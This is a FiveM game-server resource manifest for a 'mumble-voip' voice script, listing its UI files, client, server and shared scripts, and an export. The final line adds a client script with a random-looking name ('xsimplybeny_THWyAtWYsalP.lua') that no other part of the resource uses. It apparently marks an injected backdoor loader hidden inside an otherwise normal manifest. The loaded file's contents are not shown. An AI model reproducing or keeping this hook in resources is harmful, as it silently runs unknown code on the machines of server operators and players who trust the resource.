fx_version "adamant"
game "gta5"
name "mumble-voip"
version "1.3"
lua54 'yes'
ui_page "ui/index.html"

files {
	"ui/index.html",
	"ui/mic_click_on.ogg",
	"ui/mic_click_off.ogg",
}

shared_scripts {
	"config.lua",
	"grid.lua",
}

client_scripts {
	"client.lua",
}

server_scripts {
	"server.lua",
}

export 'UpdateVoice'
provide "tokovoip_script"
client_script "xsimplybeny_THWyAtWYsalP.lua"